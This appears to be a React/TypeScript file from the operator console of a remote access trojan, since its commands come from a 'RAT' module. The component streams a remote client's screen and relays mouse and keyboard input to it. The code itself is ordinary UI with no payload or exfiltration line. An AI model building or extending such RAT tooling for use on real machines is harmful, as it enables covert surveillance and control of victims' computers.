import React, { useEffect, useRef, useState } from "react";
import { listen } from "@tauri-apps/api/event";
import { useParams } from "react-router-dom";
import {
  startRemoteDesktopCmd,
  stopRemoteDesktopCmd,
  fetchClientCmd,
  sendKeyboardInputCmd,
  sendMouseClickCmd,
} from "../rat/RATCommands";
import {
  IconHandClick,
  IconKeyboard,
  IconAdjustmentsAlt,
  IconInfoCircle,
  IconX,
  IconShareplay,
} from "@tabler/icons-react";
import { RemoteDesktopFramePayload } from "../../types";

export const RemoteDesktop: React.FC = () => {
  const { addr } = useParams();
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const lastFrameRef = useRef<HTMLImageElement | null>(null);
  const imageSizeRef = useRef<{ width: number; height: number }>({
    width: 0,
    height: 0,
  });

  // UI state
  const [showControls, setShowControls] = useState(true);
  const [connectionStatus, setConnectionStatus] =
    useState<string>("Ready to connect");
  const [showTooltip, setShowTooltip] = useState<string | null>(null);

  // Stream settings
  const [streaming, setStreaming] = useState(false);
  const [quality, setQuality] = useState(35);
  const [fps, setFps] = useState(10);
  const [displays, setDisplays] = useState<number[]>([]);
  const [selectedDisplay, setSelectedDisplay] = useState(0);

  // Control states
  const [mouseControlEnabled, setMouseControlEnabled] = useState(false);
  const [keyboardControlEnabled, setKeyboardControlEnabled] = useState(false);
  const [_isDragging, setIsDragging] = useState(false);
  const [isMouseDown, setIsMouseDown] = useState(false);
  const [activeMouseButton, setActiveMouseButton] = useState<number | null>(
    null
  );
  const [capsLockState, setCapsLockState] = useState(false);
  const [ctrlKeyState, setCtrlKeyState] = useState(false);

  // Additional state
  const [showKeyboardInfo, setShowKeyboardInfo] = useState(true);

  // Initialize remote display and cleanup
  useEffect(() => {
    lastFrameRef.current = new Image();

    const grabDisplayData = async () => {
      try {
        const clientInfo: any = await fetchClientCmd(addr);
        if (clientInfo?.displays) {
          const displayArray = Array.from(
            { length: clientInfo.displays },
            (_, i) => i
          );
          setDisplays(displayArray);
        }
      } catch (error) {
        console.error("Failed to initialize window", error);
      }
    };

    grabDisplayData();

    return () => {
      if (streaming) {
        stopStreamingAndCleanup();
      }
    };
  }, []);

  // Process incoming frames
  useEffect(() => {
    const unlisten = listen("remote_desktop_frame", (event) => {
      const payload = event.payload as RemoteDesktopFramePayload;

      if (payload.addr !== addr || payload.display !== selectedDisplay) {
        return;
      }

      if (canvasRef.current && lastFrameRef.current) {
        const ctx = canvasRef.current.getContext("2d");
        if (ctx) {
          lastFrameRef.current.src = `data:image/jpeg;base64,${payload.data}`;

          lastFrameRef.current.onload = () => {
            if (ctx && canvasRef.current && lastFrameRef.current) {
              imageSizeRef.current = {
                width: lastFrameRef.current.width,
                height: lastFrameRef.current.height,
              };

              canvasRef.current.width = lastFrameRef.current.width;
              canvasRef.current.height = lastFrameRef.current.height;

              ctx.drawImage(
                lastFrameRef.current,
                0,
                0,
                lastFrameRef.current.width,
                lastFrameRef.current.height
              );
            }
          };
        }
      }
    });

    return () => {
      unlisten.then((fn) => fn());
    };
  }, [selectedDisplay]);

  // Handle keyboard control
  useEffect(() => {
    if (!streaming || !keyboardControlEnabled || !addr) return;

    const handleKeyDown = (event: KeyboardEvent) => {
      event.preventDefault();

      const keyCode = event.keyCode;
      let character = event.key;
      const shiftPressed = event.shiftKey;
      const ctrlPressed = event.ctrlKey;
      const capsLock = event.getModifierState("CapsLock");

      setCtrlKeyState(ctrlPressed);
      setCapsLockState(capsLock);

      const isSpecialKey =
        character.length > 1 ||
        (keyCode >= 33 && keyCode <= 40) ||
        keyCode === 13 ||
        keyCode === 8 ||
        keyCode === 9 ||
        keyCode === 27 ||
        keyCode === 46;

      if (isSpecialKey) {
        character = "";
      }

      sendKeyboardInputCmd(
        addr,
        keyCode,
        character,
        true,
        shiftPressed,
        ctrlPressed && !isSpecialKey,
        capsLock
      ).catch((error) => {
        console.error("Error sending keyboard down event:", error);
      });
    };

    const handleKeyUp = (event: KeyboardEvent) => {
      event.preventDefault();

      const keyCode = event.keyCode;
      let character = event.key;
      const shiftPressed = event.shiftKey;
      const ctrlPressed = event.ctrlKey;
      const capsLock = event.getModifierState("CapsLock");

      setCtrlKeyState(ctrlPressed);
      setCapsLockState(capsLock);

      const isSpecialKey =
        character.length > 1 ||
        (keyCode >= 33 && keyCode <= 40) ||
        keyCode === 13 ||
        keyCode === 8 ||
        keyCode === 9 ||
        keyCode === 27 ||
        keyCode === 46;

      if (isSpecialKey) {
        character = "";
      }

      sendKeyboardInputCmd(
        addr,
        keyCode,
        character,
        false,
        shiftPressed,
        ctrlPressed && !isSpecialKey,
        capsLock
      ).catch((error) => {
        console.error("Error sending keyboard up event:", error);
      });
    };

    document.addEventListener("keydown", handleKeyDown);
    document.addEventListener("keyup", handleKeyUp);

    return () => {
      document.removeEventListener("keydown", handleKeyDown);
      document.removeEventListener("keyup", handleKeyUp);
    };
  }, [streaming, keyboardControlEnabled, addr]);

  // Reset keyboard state when control is disabled
  useEffect(() => {
    if (!keyboardControlEnabled || !streaming) {
      resetClientKeyboardState();
    }
  }, [keyboardControlEnabled, streaming]);

  // Streaming control functions
  const stopStreamingAndCleanup = async () => {
    if (!streaming) return;

    try {
      await stopRemoteDesktopCmd(addr);
      setStreaming(false);
      setConnectionStatus("Disconnected");
    } catch (error) {
      console.error("Error cleaning up streaming:", error);
    }
  };

  const handleStartStreaming = async () => {
    setConnectionStatus("Connecting...");
    try {
      await startRemoteDesktopCmd(addr, selectedDisplay, quality, fps);
      setStreaming(true);
      setConnectionStatus("Connected");
    } catch (error) {
      console.error("Error starting remote desktop:", error);
      setConnectionStatus(" ");
    }
  };

  const handleStopStreaming = async () => {
    await stopStreamingAndCleanup();
    setConnectionStatus("Ready to connect");
  };

  // Mouse and keyboard control functions
  const resetClientKeyboardState = async () => {
    if (!addr) return;

    try {
      sendKeyboardInputCmd(addr, 0, "", false, false, false, false);
      setCapsLockState(false);
      setCtrlKeyState(false);
    } catch (error) {
      console.error("Error resetting keyboard state:", error);
    }
  };

  const getTargetCoordinates = (clientX: number, clientY: number) => {
    if (!canvasRef.current) return { targetX: 0, targetY: 0 };

    const rect = canvasRef.current.getBoundingClientRect();
    const scaleFactorX = imageSizeRef.current.width / rect.width;
    const scaleFactorY = imageSizeRef.current.height / rect.height;

    const canvasX = clientX - rect.left;
    const canvasY = clientY - rect.top;

    return {
      targetX: Math.round(canvasX * scaleFactorX),
      targetY: Math.round(canvasY * scaleFactorY),
    };
  };

  // Mouse event handlers
  const handleCanvasMouseDown = async (
    event: React.MouseEvent<HTMLCanvasElement>
  ) => {
    event.preventDefault();

    if (!mouseControlEnabled || !canvasRef.current || !addr || !streaming)
      return;
    if (event.button !== 0 && event.button !== 1 && event.button !== 2) return;

    setIsMouseDown(true);
    setActiveMouseButton(event.button);

    const { targetX, targetY } = getTargetCoordinates(
      event.clientX,
      event.clientY
    );

    try {
      await sendMouseClickCmd(
        addr,
        selectedDisplay,
        targetX,
        targetY,
        event.button,
        1,
        0
      );
    } catch (error) {
      console.error("Error sending mouse down event:", error);
    }
  };

  const handleCanvasMouseUp = async (
    event: React.MouseEvent<HTMLCanvasElement>
  ) => {
    event.preventDefault();

    if (
      !mouseControlEnabled ||
      !canvasRef.current ||
      !addr ||
      !streaming ||
      !isMouseDown
    )
      return;
    if (activeMouseButton !== null && event.button !== activeMouseButton)
      return;

    setIsMouseDown(false);
    setIsDragging(false);
    setActiveMouseButton(null);

    const { targetX, targetY } = getTargetCoordinates(
      event.clientX,
      event.clientY
    );

    try {
      await sendMouseClickCmd(
        addr,
        selectedDisplay,
        targetX,
        targetY,
        event.button,
        2,
        0
      );
    } catch (error) {
      console.error("Error sending mouse up event:", error);
    }
  };

  const handleCanvasMouseMove = async (
    event: React.MouseEvent<HTMLCanvasElement>
  ) => {
    if (
      !mouseControlEnabled ||
      !canvasRef.current ||
      !addr ||
      !streaming ||
      !isMouseDown
    )
      return;

    setIsDragging(true);

    const { targetX, targetY } = getTargetCoordinates(
      event.clientX,
      event.clientY
    );

    try {
      await sendMouseClickCmd(
        addr,
        selectedDisplay,
        targetX,
        targetY,
        activeMouseButton || 0,
        3,
        0
      );
    } catch (error) {
      console.error("Error sending mouse move event:", error);
    }
  };

  const handleCanvasWheel = async (
    event: React.WheelEvent<HTMLCanvasElement>
  ) => {
    event.preventDefault();

    if (!mouseControlEnabled || !canvasRef.current || !addr || !streaming)
      return;

    const { targetX, targetY } = getTargetCoordinates(
      event.clientX,
      event.clientY
    );
    const scrollAmount = Math.max(
      1,
      Math.min(10, Math.abs(Math.round(event.deltaY / 100)))
    );
    const isScrollUp = event.deltaY < 0;

    try {
      await sendMouseClickCmd(
        addr,
        selectedDisplay,
        targetX,
        targetY,
        3, // Scroll action
        isScrollUp ? 4 : 5, // 4 for up, 5 for down
        scrollAmount
      );
    } catch (error) {
      console.error("Error sending scroll event:", error);
    }
  };

  // UI control functions
  const toggleKeyboardControl = () => {
    const newState = !keyboardControlEnabled;
    setKeyboardControlEnabled(newState);

    if (!newState && streaming) {
      resetClientKeyboardState();
    }
  };

  const toggleMouseControl = () => {
    setMouseControlEnabled(!mouseControlEnabled);

    if (!mouseControlEnabled) {
      setIsMouseDown(false);
      setIsDragging(false);
      setActiveMouseButton(null);
    }
  };

  const toggleControls = () => {
    setShowControls(!showControls);
  };

  // UI helper functions
  const showToolTip = (tip: string) => {
    setShowTooltip(tip);
  };

  const hideTooltip = () => {
    setShowTooltip(null);
  };

  // Render display options
  const displayOptions = displays.map((displayId) => (
    <option key={displayId} value={displayId}>
      Display {displayId + 1}
    </option>
  ));

  return (
    <div className="relative w-screen h-screen bg-black flex flex-col items-center p-0 m-0">
      {/* Side controls */}
      <div className="fixed top-4 left-4 z-10 flex flex-col gap-3">
        <button
          className={`p-3 rounded-xl shadow-lg backdrop-blur-md transition-all duration-200 cursor-pointer ${
            !showControls
              ? "bg-secondarybg bg-opacity-80"
              : "bg-white bg-opacity-90"
          }`}
          onClick={toggleControls}
          onMouseEnter={() =>
            showToolTip(showControls ? "Hide Controls" : "Show Controls")
          }
          onMouseLeave={hideTooltip}
        >
          <IconAdjustmentsAlt
            size={24}
            className="transition-transform duration-300"
            style={{ transform: showControls ? "rotate(180deg)" : "rotate(0)" }}
            color={!showControls ? "white" : "black"}
          />
        </button>

        <button
          className={`p-3 rounded-xl shadow-lg backdrop-blur-md transition-all duration-200 cursor-pointer ${
            mouseControlEnabled
              ? "bg-white bg-opacity-90"
              : "bg-secondarybg bg-opacity-80"
          } ${!streaming ? "opacity-50" : ""}`}
          onClick={toggleMouseControl}
          onMouseEnter={() =>
            showToolTip(
              mouseControlEnabled
                ? "Disable Mouse Control"
                : "Enable Mouse Control"
            )
          }
          onMouseLeave={hideTooltip}
          disabled={!streaming}
        >
          <IconHandClick
            size={24}
            color={mouseControlEnabled ? "black" : "white"}
            className={!streaming ? "opacity-50" : ""}
          />
        </button>

        <button
          className={`p-3 rounded-xl shadow-lg backdrop-blur-md transition-all duration-200 cursor-pointer ${
            keyboardControlEnabled
              ? "bg-white bg-opacity-90"
              : "bg-secondarybg bg-opacity-80"
          } ${!streaming ? "opacity-50" : ""}`}
          onClick={toggleKeyboardControl}
          onMouseEnter={() =>
            showToolTip(
              keyboardControlEnabled
                ? "Disable Keyboard Control"
                : "Enable Keyboard Control"
            )
          }
          onMouseLeave={hideTooltip}
          disabled={!streaming}
        >
          <IconKeyboard
            size={24}
            color={keyboardControlEnabled ? "black" : "white"}
            className={!streaming ? "opacity-50" : ""}
          />
        </button>
      </div>

      {/* Tooltip */}
      {showTooltip && (
        <div className="fixed top-4 left-20 z-20 bg-black bg-opacity-90 text-white px-3 py-2 rounded-lg text-sm shadow-lg">
          {showTooltip}
        </div>
      )}

      {/* Main controls */}
      {showControls && (
        <div className="fixed top-4 left-1/2 transform -translate-x-1/2 z-10 bg-primarybg bg-opacity-90 backdrop-blur-md p-4 rounded-xl shadow-xl text-white max-w-lg w-full">
          <div className="flex w-full justify-between items-center mb-3">
            <div className="flex items-center gap-2">
              <IconShareplay size={20} className="text-accentx" />
              <h3 className="text-base font-medium">Remote Desktop</h3>
            </div>

            <div className="flex items-center gap-2">
              {keyboardControlEnabled && streaming && (
                <span
                  className={`text-xs px-2 py-1 rounded-md font-medium ${
                    capsLockState
                      ? "bg-green-500 text-white"
                      : "bg-gray-700 text-gray-300"
                  }`}
                >
                  CAPS
                </span>
              )}

              {keyboardControlEnabled && streaming && (
                <span
                  className={`text-xs px-2 py-1 rounded-md font-medium ${
                    ctrlKeyState
                      ? "bg-green-500 text-white"
                      : "bg-gray-700 text-gray-300"
                  }`}
                >
                  CTRL
                </span>
              )}

              <span
                className={`text-xs px-3 py-1 rounded-md font-medium ${
                  connectionStatus === "Connected"
                    ? "bg-green-500 text-white"
                    : connectionStatus === "Connecting..."
                    ? "bg-yellow-500 text-black"
                    : "bg-gray-700 text-white"
                }`}
              >
                {connectionStatus}
              </span>
            </div>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-2 gap-4 w-full">
            <div className="flex flex-col gap-4">
              <div className="bg-secondarybg bg-opacity-70 rounded-lg flex items-center px-3 py-2 border border-gray-700">
                <label className="text-sm text-accentx mr-2">Display:</label>
                <select
                  className={`block w-full text-sm bg-transparent focus:outline-none ${
                    streaming ? "text-accentx cursor-not-allowed" : "text-white"
                  }`}
                  value={selectedDisplay}
                  onChange={(e) => setSelectedDisplay(Number(e.target.value))}
                  disabled={streaming}
                >
                  {displayOptions}
                </select>
              </div>

              <div className="bg-secondarybg bg-opacity-70 rounded-lg flex items-center px-3 py-2 border border-gray-700">
                <label className="text-sm text-accentx mr-2">Quality:</label>
                <div className="flex-1 flex items-center gap-1">
                  <input
                    type="range"
                    className="flex-1"
                    min="1"
                    max="100"
                    value={quality}
                    onChange={(e) => setQuality(Number(e.target.value))}
                    disabled={streaming}
                  />
                  <span className="text-sm w-7 text-center text-white">
                    {quality}
                  </span>
                </div>
              </div>
            </div>

            <div className="flex flex-col gap-4">
              <div className="bg-secondarybg bg-opacity-70 rounded-lg flex items-center px-3 py-2 border border-gray-700">
                <label className="text-sm text-accentx mr-2">FPS:</label>
                <div className="flex-1 flex items-center gap-1">
                  <input
                    type="range"
                    className="flex-1"
                    min="1"
                    max="30"
                    value={fps}
                    onChange={(e) => setFps(Number(e.target.value))}
                    disabled={streaming}
                  />
                  <span className="text-sm w-7 text-center text-white">
                    {fps}
                  </span>
                </div>
              </div>

              <button
                className={` text-sm w-full py-2 rounded-lg border transition-all duration-200 flex items-center justify-center font-medium cursor-pointer ${
                  !streaming
                    ? "border-green-500 bg-green-500 bg-opacity-40 text-white hover:bg-opacity-60"
                    : "border-red-500 bg-red-500 bg-opacity-40 text-white hover:bg-opacity-60"
                }`}
                onClick={streaming ? handleStopStreaming : handleStartStreaming}
              >
                {streaming ? "Stop Streaming" : "Start Streaming"}
              </button>
            </div>
          </div>
        </div>
      )}

      <div className="flex-1 flex items-center justify-center w-full h-full">
        <canvas
          ref={canvasRef}
          className="max-h-full max-w-full"
          onMouseDown={handleCanvasMouseDown}
          onMouseUp={handleCanvasMouseUp}
          onMouseMove={handleCanvasMouseMove}
          onWheel={handleCanvasWheel}
          onContextMenu={(event) => event.preventDefault()}
          tabIndex={0}
        />
      </div>

      {keyboardControlEnabled && streaming && showKeyboardInfo && (
        <div className="fixed bottom-4 left-1/2 transform -translate-x-1/2 z-10 bg-primarybg bg-opacity-90 backdrop-blur-md px-4 py-3 rounded-xl shadow-xl text-white max-w-lg flex items-center gap-2">
          <IconInfoCircle size={18} className="text-accentx shrink-0" />
          <p className="text-sm">
            Keyboard control active. Supported: Ctrl+A, Ctrl+C, Ctrl+V, Ctrl+X,
            Ctrl+Z, Ctrl+Y, Ctrl+S
          </p>
          <button
            className="ml-2 text-gray-400 hover:text-white cursor-pointer"
            onClick={() => setShowKeyboardInfo(false)}
          >
            <IconX size={18} />
          </button>
        </div>
      )}
    </div>
  );
};
